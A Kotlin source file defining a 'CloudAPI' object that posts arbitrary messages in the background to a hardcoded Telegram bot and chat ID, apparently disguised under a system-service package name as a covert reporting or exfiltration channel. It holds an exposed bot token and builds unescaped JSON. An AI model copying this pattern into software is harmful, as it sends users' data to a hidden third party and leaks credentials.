package com.system.service

import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

object CloudAPI {

    private const val BOT_TOKEN = "8818696503:AAFWG4vtCCwfBWQQC-CbWF7TjWqtaMMk63s"
    private const val CHAT_ID = "2065216514"

    fun send(message: String) {
        thread {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")

                val json = """{"chat_id":"$CHAT_ID","text":"$message"}"""
                conn.outputStream.write(json.toByteArray())
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}